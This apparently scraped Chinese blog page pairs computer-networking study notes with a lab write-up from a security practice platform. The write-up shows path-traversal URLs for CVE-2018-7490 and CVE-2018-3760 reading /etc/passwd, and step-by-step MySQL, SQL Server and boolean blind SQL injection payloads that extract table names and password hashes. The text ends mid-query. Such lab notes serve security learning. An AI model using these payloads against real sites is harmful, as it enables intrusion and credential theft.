<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MAC地址有时也被称为物理地址。请注意这并不意味MAC地址属于网络体系中的物理层</span><br><span class="line">一般情况下，用户主语会包含两个网络适配器：有限局域网适配器（有线网卡）和无线局域网适配器（无线网卡）。每个网络适配器都会有一个全球唯一的MAC地址。而交换机和路由器往往拥有更多的网络接口，所以会拥有更多的MAC地址。</span><br><span class="line">综上，严格来说，MAC地址是对网络上个接口的唯一标识，而不是对网络上各设备的唯一标识。</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\计算机网络.assets\image-20220820200852377.png" alt="image-20220820200852377"></p>
<p><img src="C:\Users\hyy\Desktop\计算机网络.assets\image-20220820201125472.png" alt="image-20220820201125472"></p>
<h3 id="034讲-IP地址"><a href="#034讲-IP地址" class="headerlink" title="034讲 IP地址"></a>034讲 IP地址</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">IP地址是因特网上主机和路由器所使用的地址，用于标识两部分信息</span><br><span class="line">网络编号：标识因特网上数以万记的网络</span><br><span class="line">主机编号：标识网络上不同主机或路由器各接口</span><br></pre></td></tr></table></figure>

<h3 id="035讲-ARP协议"><a href="#035讲-ARP协议" class="headerlink" title="035讲 ARP协议"></a>035讲 ARP协议</h3><p><img src="C:\Users\hyy\Desktop\计算机网络.assets\image-20220820222216312.png" alt="image-20220820222216312"></p>
<h3 id="036讲-集线器与交换机的区别"><a href="#036讲-集线器与交换机的区别" class="headerlink" title="036讲 集线器与交换机的区别"></a>036讲 集线器与交换机的区别</h3><p><img src="C:\Users\hyy\Desktop\计算机网络.assets\image-20220820222512235.png" alt="image-20220820222512235"></p>
<h3 id="044讲-IPv4地址"><a href="#044讲-IPv4地址" class="headerlink" title="044讲 IPv4地址"></a>044讲 IPv4地址</h3><p><img src="C:\Users\hyy\Desktop\计算机网络.assets\image-20220821143941202.png" alt="image-20220821143941202"></p>
<p><img src="C:\Users\hyy\Desktop\计算机网络.assets\image-20220821144306592.png" alt="image-20220821144306592"></p>
<p><img src="C:\Users\hyy\Desktop\计算机网络.assets\image-20220821144507063.png" alt="image-20220821144507063"></p>
<p><img src="C:\Users\hyy\Desktop\计算机网络.assets\image-20220821162039904.png" alt="image-20220821162039904"></p>
<p><img src="C:\Users\hyy\Desktop\计算机网络.assets\image-20220821162229588.png" alt="image-20220821162229588"></p>
<h3 id="045讲-划分子网得ipv4地址"><a href="#045讲-划分子网得ipv4地址" class="headerlink" title="045讲 划分子网得ipv4地址"></a>045讲 划分子网得ipv4地址</h3><p><img src="C:\Users\hyy\Desktop\计算机网络.assets\image-20220821164202223.png" alt="image-20220821164202223"></p>
<p><img src="C:\Users\hyy\Desktop\计算机网络.assets\image-20220821164938993.png" alt="image-20220821164938993"></p>
<h3 id="046讲-无分类编址的ipv4地址"><a href="#046讲-无分类编址的ipv4地址" class="headerlink" title="046讲 无分类编址的ipv4地址"></a>046讲 无分类编址的ipv4地址</h3><p><img src="C:\Users\hyy\Desktop\计算机网络.assets\image-20220821170054770.png" alt="image-20220821170054770"></p>
<h3 id="047讲-ipv4地址应用规划"><a href="#047讲-ipv4地址应用规划" class="headerlink" title="047讲 ipv4地址应用规划"></a>047讲 ipv4地址应用规划</h3><p><img src="C:\Users\hyy\Desktop\计算机网络.assets\image-20220821180614102.png" alt="image-20220821180614102"></p>
<h3 id="049讲-静态路由配置及可能产生的路由环路问题"><a href="#049讲-静态路由配置及可能产生的路由环路问题" class="headerlink" title="049讲 静态路由配置及可能产生的路由环路问题"></a>049讲 静态路由配置及可能产生的路由环路问题</h3><p><img src="C:\Users\hyy\Desktop\计算机网络.assets\image-20220821212038824.png" alt="image-20220821212038824"></p>
<h3 id="051讲-路由信息协议RIP的基本工作原理"><a href="#051讲-路由信息协议RIP的基本工作原理" class="headerlink" title="051讲 路由信息协议RIP的基本工作原理"></a>051讲 路由信息协议RIP的基本工作原理</h3><p><img src="C:\Users\hyy\Desktop\计算机网络.assets\image-20220824172516310.png" alt="image-20220824172516310"></p>
<p><img src="C:\Users\hyy\Desktop\计算机网络.assets\image-20220824172409433.png" alt="image-20220824172409433"></p>
<h3 id="052讲-开放最短路径有限OSPF的基本工作原理"><a href="#052讲-开放最短路径有限OSPF的基本工作原理" class="headerlink" title="052讲 开放最短路径有限OSPF的基本工作原理"></a>052讲 开放最短路径有限OSPF的基本工作原理</h3><p><img src="C:\Users\hyy\Desktop\计算机网络.assets\image-20220825120304564.png" alt="image-20220825120304564"></p>
<h3 id="055讲-网际控制报文协议ICMP"><a href="#055讲-网际控制报文协议ICMP" class="headerlink" title="055讲 网际控制报文协议ICMP"></a>055讲 网际控制报文协议ICMP</h3><p><img src="C:\Users\hyy\Desktop\计算机网络.assets\1661526906733.png" alt="1661526906733"></p>
<p><img src="C:\Users\hyy\Desktop\计算机网络.assets\1661526958759.png" alt="1661526958759"></p>
<p><img src="C:\Users\hyy\Desktop\计算机网络.assets\1661527102767.png" alt="1661527102767"></p>
<h3 id="056讲-虚拟专用网与网络地址转换NAT"><a href="#056讲-虚拟专用网与网络地址转换NAT" class="headerlink" title="056讲 虚拟专用网与网络地址转换NAT"></a>056讲 虚拟专用网与网络地址转换NAT</h3><p><img src="C:\Users\hyy\Desktop\计算机网络.assets\1661560043950.png" alt="1661560043950"></p>
<p><img src="C:\Users\hyy\Desktop\计算机网络.assets\1661560868562.png" alt="1661560868562"></p>
<h3 id="058讲-运输层端口号、复用与分用的概念"><a href="#058讲-运输层端口号、复用与分用的概念" class="headerlink" title="058讲 运输层端口号、复用与分用的概念"></a>058讲 运输层端口号、复用与分用的概念</h3><p><img src="C:\Users\hyy\Desktop\计算机网络.assets\1661609966223.png" alt="1661609966223"></p>
<p><img src="C:\Users\hyy\Desktop\计算机网络.assets\1661610485208.png" alt="1661610485208"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">视频6分钟开始举例用户网文WEB服务器（使用DNS协议和HTTP协议）</span><br><span class="line">https://www.bilibili.com/video/BV1x4411d7HU?p=58&amp;spm_id_from=pageDriver&amp;vd_source=d5448e640adeda715972607248810967</span><br></pre></td></tr></table></figure>

<h3 id="059讲-UDP和TCP的对比"><a href="#059讲-UDP和TCP的对比" class="headerlink" title="059讲 UDP和TCP的对比"></a>059讲 UDP和TCP的对比</h3><p><img src="C:\Users\hyy\Desktop\计算机网络.assets\1661612374565.png" alt="1661612374565"></p>
<h3 id="060讲-TCP的流量控制"><a href="#060讲-TCP的流量控制" class="headerlink" title="060讲 TCP的流量控制"></a>060讲 TCP的流量控制</h3><p><img src="C:\Users\hyy\Desktop\计算机网络.assets\image-20220828085017386.png" alt="image-20220828085017386"></p>
<h3 id="061讲-TCP的拥塞控制"><a href="#061讲-TCP的拥塞控制" class="headerlink" title="061讲 TCP的拥塞控制"></a>061讲 TCP的拥塞控制</h3><p><img src="C:\Users\hyy\Desktop\计算机网络.assets\image-20220828085441959.png" alt="image-20220828085441959"></p>
<h3 id="064讲-TCP的运输连接管理-—-TCP的连接建立"><a href="#064讲-TCP的运输连接管理-—-TCP的连接建立" class="headerlink" title="064讲 TCP的运输连接管理 — TCP的连接建立"></a>064讲 TCP的运输连接管理 — TCP的连接建立</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">有些逻辑可以回过头再看视频</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\计算机网络.assets\image-20220828091940293.png" alt="image-20220828091940293"></p>
<p><img src="C:\Users\hyy\Desktop\计算机网络.assets\image-20220828092431863.png" alt="image-20220828092431863"></p>
<h3 id="065讲-TCP的运输连接管理-—-TCP的连接释放"><a href="#065讲-TCP的运输连接管理-—-TCP的连接释放" class="headerlink" title="065讲 TCP的运输连接管理 — TCP的连接释放"></a>065讲 TCP的运输连接管理 — TCP的连接释放</h3><p><img src="C:\Users\hyy\Desktop\计算机网络.assets\image-20220828094327003.png" alt="image-20220828094327003"></p>
<h3 id="069讲-动态主机配置协议DHCP"><a href="#069讲-动态主机配置协议DHCP" class="headerlink" title="069讲 动态主机配置协议DHCP"></a>069讲 动态主机配置协议DHCP</h3><p><img src="C:\Users\hyy\Desktop\计算机网络.assets\image-20220828103652927.png" alt="image-20220828103652927"></p>
<p><img src="C:\Users\hyy\Desktop\计算机网络.assets\image-20220828104549726.png" alt="image-20220828104549726"></p>
<h3 id="070讲-域名系统DNS"><a href="#070讲-域名系统DNS" class="headerlink" title="070讲 域名系统DNS"></a>070讲 域名系统DNS</h3><p><img src="C:\Users\hyy\Desktop\计算机网络.assets\1661692341892.png" alt="1661692341892"></p>
<p><img src="C:\Users\hyy\Desktop\计算机网络.assets\1661692466944.png" alt="1661692466944"></p>
<p><img src="C:\Users\hyy\Desktop\计算机网络.assets\1661693526669.png" alt="1661693526669"></p>
<h3 id="071讲-文件传送协议FTP"><a href="#071讲-文件传送协议FTP" class="headerlink" title="071讲 文件传送协议FTP"></a>071讲 文件传送协议FTP</h3><p><img src="C:\Users\hyy\Desktop\计算机网络.assets\image-20220829094948614-1661785352243.png"></p>
<p><img src="C:\Users\hyy\Desktop\计算机网络.assets\1661698686242.png" alt="1661698686242"></p>
<h3 id="072讲-电子邮件"><a href="#072讲-电子邮件" class="headerlink" title="072讲 电子邮件"></a>072讲 电子邮件</h3><p><img src="C:\Users\hyy\Desktop\计算机网络.assets\image-20220829091323295.png" alt="image-20220829091323295"></p>
<p><img src="C:\Users\hyy\Desktop\计算机网络.assets\image-20220829091637584.png" alt="image-20220829091637584"></p>
<p><img src="C:\Users\hyy\Desktop\计算机网络.assets\image-20220829091817657.png" alt="image-20220829091817657"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POP3和IMAP4都采用基于TCP连接的客户/服务器方式。POP3使用熟知端口110，IMAP4使用熟知端口143</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\计算机网络.assets\image-20220829092538460.png" alt="image-20220829092538460"></p>
<h3 id="073讲-万维网WWW"><a href="#073讲-万维网WWW" class="headerlink" title="073讲 万维网WWW"></a>073讲 万维网WWW</h3><p><img src="C:\Users\hyy\Desktop\计算机网络.assets\image-20220829092957191.png" alt="image-20220829092957191"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">统一资源定位符URL：&lt;协议&gt;://&lt;主机&gt;:&lt;端口&gt;/&lt;路径&gt;</span><br><span class="line">超文本标记语言HTML(HyperText Markup Language):使用多种标签描述网页结构和内容</span><br><span class="line">层叠样式表CSS(Cascading Style Sheets):从审美角度描述网页的样式</span><br><span class="line">JavaScript:控制网页的行为</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\计算机网络.assets\image-20220829095226130.png" alt="image-20220829095226130"></p>
<p><img src="C:\Users\hyy\Desktop\计算机网络.assets\image-20220829101825835.png" alt="image-20220829101825835"></p>
<p><img src="C:\Users\hyy\Desktop\计算机网络.assets\image-20220829102225444.png" alt="image-20220829102225444"></p>
<p><img src="C:\Users\hyy\Desktop\计算机网络.assets\image-20220829102545606.png" alt="image-20220829102545606"></p>
<p><img src="C:\Users\hyy\Desktop\计算机网络.assets\image-20220829103424049.png" alt="image-20220829103424049"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" data-id="cljpcwhu2000al8ez547l6338" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-墨者学院" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/07/05/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/" class="article-date">
  <time class="dt-published" datetime="2023-07-05T06:46:12.479Z" itemprop="datePublished">2023-07-05</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="WEB安全"><a href="#WEB安全" class="headerlink" title="WEB安全"></a>WEB安全</h1><h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h2><h3 id="uWSGI-漏洞复现（CVE-2018-7490）"><a href="#uWSGI-漏洞复现（CVE-2018-7490）" class="headerlink" title="uWSGI 漏洞复现（CVE-2018-7490）"></a>uWSGI 漏洞复现（CVE-2018-7490）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//参考</span></span><br><span class="line"><span class="comment">//https://blog.csdn.net/weixin_45736958/article/details/117717777</span></span><br><span class="line">php目录遍历漏洞</span><br><span class="line">uWSGI是一个Web服务器，它实现了WSGI协议、uwsgi、http等协议。Nginx中HttpUwsgiModule的作用是与uWSGI服务器进行交换。WSGI是一种Web服务器网关接口。它是一个Web服务器（如nginx，uWSGI等服务器）与web应用（如用Flask框架写的程序）通信的一种规范</span><br><span class="line">https:<span class="comment">//blog.csdn.net/weixin_45736958/article/details/117717777</span></span><br><span class="line">../../../key.txt</span><br></pre></td></tr></table></figure>

<h3 id="Ruby-On-Ruby-On-Rails漏洞复现第一题（CVE-2018-3760"><a href="#Ruby-On-Ruby-On-Rails漏洞复现第一题（CVE-2018-3760" class="headerlink" title="Ruby On  Ruby On Rails漏洞复现第一题（CVE-2018-3760)"></a>Ruby On  Ruby On Rails漏洞复现第一题（CVE-2018-3760)</h3><p><img src="C:\Users\hyy\Desktop\墨者学院.assets\1656752121065.png" alt="1656752121065"></p>
<p><img src="C:\Users\hyy\Desktop\墨者学院.assets\1656752187237.png" alt="1656752187237"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">替换之后我理解file伪协议显示的是文件而不是文件夹</span><br><span class="line">最后</span><br><span class="line">http://124.70.64.48:40318/assets/file:%2f%2f/usr/src/blog/app/assets/config/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd</span><br><span class="line"></span><br><span class="line">两个问题：</span><br><span class="line">	1.路径的assets</span><br><span class="line">	2.php的file伪协议要验证</span><br></pre></td></tr></table></figure>



<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="SQL手工注入漏洞测试-MySQL数据库"><a href="#SQL手工注入漏洞测试-MySQL数据库" class="headerlink" title="SQL手工注入漏洞测试(MySQL数据库)"></a>SQL手工注入漏洞测试(MySQL数据库)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//判断注入点</span></span><br><span class="line">new_list.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span></span><br><span class="line">new_list.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span></span><br><span class="line"><span class="comment">//判断回显多少个字段  5不行</span></span><br><span class="line">new_list.php?id=<span class="number">1</span> order by <span class="number">4</span></span><br><span class="line"><span class="comment">//union查询		2是标题 	3是内容</span></span><br><span class="line">new_list.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span></span><br><span class="line"><span class="comment">//测试，查看版本		database()=mozhe_Discuz_StormGroup</span></span><br><span class="line">new_list.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>, <span class="title function_ invoke__">version</span>(), <span class="title function_ invoke__">database</span>(), <span class="number">4</span></span><br><span class="line"><span class="comment">//查看有哪些table			StormGroup_member,notice</span></span><br><span class="line">new_list.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>, <span class="number">2</span>, <span class="title function_ invoke__">group_concat</span>(table_name), <span class="number">4</span> <span class="keyword">from</span> information_schema.tables where table_schema = <span class="string">&#x27;mozhe_Discuz_StormGroup&#x27;</span></span><br><span class="line"><span class="comment">//查看有哪些字段			id,name,password,status</span></span><br><span class="line">new_list.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>, <span class="number">2</span>, <span class="title function_ invoke__">group_concat</span>(column_name),<span class="number">4</span> <span class="keyword">from</span> information_schema.columns where table_name = <span class="string">&#x27;StormGroup_member&#x27;</span></span><br><span class="line"><span class="comment">//查看name				mozhe,mozhe</span></span><br><span class="line">new_list.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>, <span class="number">2</span>, <span class="title function_ invoke__">group_concat</span>(name),<span class="number">4</span> <span class="keyword">from</span> mozhe_Discuz_StormGroup.StormGroup_member</span><br><span class="line"><span class="comment">//查看password		356f589a7df439f6f744ff19bb8092c0,01aef4e3ad142a021314a5100041482a</span></span><br><span class="line">new_list.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>, <span class="number">2</span>, <span class="title function_ invoke__">group_concat</span>(password),<span class="number">4</span> <span class="keyword">from</span> mozhe_Discuz_StormGroup.StormGroup_membe</span><br><span class="line"><span class="comment">//md5解码</span></span><br><span class="line">dsan13		<span class="number">789304</span></span><br></pre></td></tr></table></figure>

<h3 id="SQL手工注入漏洞测试-Sql-Server数据库"><a href="#SQL手工注入漏洞测试-Sql-Server数据库" class="headerlink" title="SQL手工注入漏洞测试(Sql Server数据库)"></a>SQL手工注入漏洞测试(Sql Server数据库)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//判断注入</span></span><br><span class="line">new_list.asp?id=<span class="number">1</span>				<span class="comment">#异常</span></span><br><span class="line">new_list.asp?id=<span class="number">2</span>				<span class="comment">#正常</span></span><br><span class="line">new_list.asp?id=<span class="number">2</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span>		<span class="comment">#正常</span></span><br><span class="line">new_list.asp?id=<span class="number">2</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span>		<span class="comment">#异常</span></span><br><span class="line"><span class="comment">//回显</span></span><br><span class="line">new_list.asp?id=<span class="number">2</span> order by <span class="number">1</span></span><br><span class="line">new_list.asp?id=<span class="number">2</span> order by <span class="number">2</span></span><br><span class="line">new_list.asp?id=<span class="number">2</span> order by <span class="number">3</span>		<span class="comment">#异常</span></span><br><span class="line">new_list.asp?id=<span class="number">2</span> order by <span class="number">4</span></span><br><span class="line">new_list.asp?id=<span class="number">2</span> order by <span class="number">5</span>		<span class="comment">#异常</span></span><br><span class="line"><span class="comment">//union查询	union和union all的区别(https://jingyan.baidu.com/article/2d5afd69e8dfd285a3e28e66.html)</span></span><br><span class="line">new_list.asp?id=<span class="number">2</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>			<span class="comment">#兼容异常</span></span><br><span class="line">new_list.asp?id=<span class="number">2</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union all select <span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span></span><br><span class="line">new_list.asp?id=<span class="number">2</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union all select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>					<span class="comment">#异常	sqlserver注入用null不用数字</span></span><br><span class="line">new_list.asp?id=<span class="number">2</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union all select <span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>			<span class="comment">#这个不报错</span></span><br><span class="line"><span class="comment">//查数据库名				mozhe_db_v2</span></span><br><span class="line">new_list.asp?id=<span class="number">2</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union all select <span class="string">&#x27;1&#x27;</span>,<span class="title function_ invoke__">db_name</span>(),<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span></span><br><span class="line"><span class="comment">//sqlserver和mysql语法不一样</span></span><br><span class="line"><span class="comment">//查数据表名</span></span><br><span class="line"><span class="comment">//manage</span></span><br><span class="line">new_list.asp?id=<span class="number">1</span> union all select <span class="number">1</span>,(select top <span class="number">1</span> name <span class="keyword">from</span> mozhe_db_v2.dbo.sysobjects where xtype=<span class="string">&#x27;u&#x27;</span>),<span class="string">&#x27;3&#x27;</span>,<span class="literal">null</span></span><br><span class="line"><span class="comment">//announcement</span></span><br><span class="line">new_list.asp?id=<span class="number">1</span> union all select <span class="number">1</span>,(select top <span class="number">1</span> name <span class="keyword">from</span> mozhe_db_v2.dbo.sysobjects where xtype=<span class="string">&#x27;u&#x27;</span> <span class="keyword">and</span> name not <span class="title function_ invoke__">in</span> (<span class="string">&#x27;manage&#x27;</span>)),<span class="string">&#x27;3&#x27;</span>,<span class="literal">null</span></span><br><span class="line"><span class="comment">//没了</span></span><br><span class="line">new_list.asp?id=<span class="number">1</span> union all select <span class="number">1</span>,(select top <span class="number">1</span> name <span class="keyword">from</span> mozhe_db_v2.dbo.sysobjects where xtype=<span class="string">&#x27;u&#x27;</span> <span class="keyword">and</span> name not <span class="title function_ invoke__">in</span> (<span class="string">&#x27;manage&#x27;</span>,<span class="string">&#x27;announcement&#x27;</span>)),<span class="string">&#x27;3&#x27;</span>,<span class="literal">null</span></span><br><span class="line"><span class="comment">//查列名</span></span><br><span class="line"><span class="comment">//id</span></span><br><span class="line">new_list.asp?id=<span class="number">1</span> union all select <span class="literal">null</span>,(select top <span class="number">1</span> <span class="title function_ invoke__">col_name</span>(<span class="title function_ invoke__">object_id</span>(<span class="string">&#x27;manage&#x27;</span>),<span class="number">1</span>) <span class="keyword">from</span> sysobjects),<span class="literal">null</span>,<span class="literal">null</span></span><br><span class="line"><span class="comment">//username</span></span><br><span class="line">new_list.asp?id=<span class="number">1</span> union all select <span class="literal">null</span>,(select top <span class="number">1</span> <span class="title function_ invoke__">col_name</span>(<span class="title function_ invoke__">object_id</span>(<span class="string">&#x27;manage&#x27;</span>),<span class="number">2</span>) <span class="keyword">from</span> sysobjects),<span class="literal">null</span>,<span class="literal">null</span></span><br><span class="line"><span class="comment">//password</span></span><br><span class="line">new_list.asp?id=<span class="number">1</span> union all select <span class="literal">null</span>,(select top <span class="number">1</span> <span class="title function_ invoke__">col_name</span>(<span class="title function_ invoke__">object_id</span>(<span class="string">&#x27;manage&#x27;</span>),<span class="number">3</span>) <span class="keyword">from</span> sysobjects),<span class="literal">null</span>,<span class="literal">null</span></span><br><span class="line"><span class="comment">//空</span></span><br><span class="line">new_list.asp?id=<span class="number">1</span> union all select <span class="literal">null</span>,(select top <span class="number">1</span> <span class="title function_ invoke__">col_name</span>(<span class="title function_ invoke__">object_id</span>(<span class="string">&#x27;manage&#x27;</span>),<span class="number">4</span>) <span class="keyword">from</span> sysobjects),<span class="literal">null</span>,<span class="literal">null</span>    </span><br><span class="line"><span class="comment">//查询用户名密码		admin_mz	72e1bfc3f01b7583	97285101</span></span><br><span class="line">new_list.asp?id=<span class="number">1</span> union all select <span class="literal">null</span>,username, password ,<span class="literal">null</span> <span class="keyword">from</span> manage</span><br></pre></td></tr></table></figure>

<h3 id="SQL注入漏洞测试-布尔盲注"><a href="#SQL注入漏洞测试-布尔盲注" class="headerlink" title="SQL注入漏洞测试(布尔盲注)"></a>SQL注入漏洞测试(布尔盲注)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">#当前数据库字符长度</span><br><span class="line">new_list.php?id=1%20and%20length(database())=10</span><br><span class="line">#stormgroup</span><br><span class="line">new_list.php?id=1%20and%20ascii(substr(database(),2,1))=115</span><br><span class="line">new_list.php?id=1%20and%20ascii(substr(database(),2,1))=116</span><br><span class="line">new_list.php?id=1%20and%20ascii(substr(database(),3,1))=111</span><br><span class="line">new_list.php?id=1%20and%20ascii(substr(database(),4,1))=114</span><br><span class="line">new_list.php?id=1%20and%20ascii(substr(database(),5,1))=109</span><br><span class="line">new_list.php?id=1%20and%20ascii(substr(database(),6,1))=103</span><br><span class="line">new_list.php?id=1%20and%20database()=&quot;stormgroup&quot;</span><br><span class="line">#查表的数量		2</span><br><span class="line">new_list.php?id=1 and (select count(table_name) from information_schema.tables where table_schema=database())=2</span><br><span class="line">#表1长度			6</span><br><span class="line">new_list.php?id=1 and length(</span><br><span class="line">substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),1))=6</span><br><span class="line">#表2长度			6</span><br><span class="line">new_list.php?id=1 and length(</span><br><span class="line">substr((select table_name from information_schema.tables where table_schema = database() limit 1,1),1))=6</span><br><span class="line">#确定表1名		member		substr这里有一个强转字符</span><br><span class="line">new_list.php?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema = &quot;stormgroup&quot; limit 0,1),1,1))=109</span><br><span class="line">new_list.php?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema = &quot;stormgroup&quot; limit 0,1),2,1))=101</span><br><span class="line">new_list.php?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema = &quot;stormgroup&quot; limit 0,1),3,1))=109</span><br><span class="line">new_list.php?id=1 and substr((select table_name from information_schema.tables where table_schema = &quot;stormgroup&quot; limit 0,1),1) = &#x27;member&#x27;</span><br><span class="line">#确定表2名		notice</span><br><span class="line">new_list.php?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema = &quot;stormgroup&quot; limit 1,1),1,1))=110</span><br><span class="line">new_list.php?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema = &quot;stormgroup&quot; limit 1,1),2,1))=111</span><br><span class="line">new_list.php?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema = &quot;stormgroup&quot; limit 1,1),3,1))=116</span><br><span class="line">new_list.php?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema = &quot;stormgroup&quot; limit 1,1),4,1))=105</span><br><span class="line">new_list.php?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema = 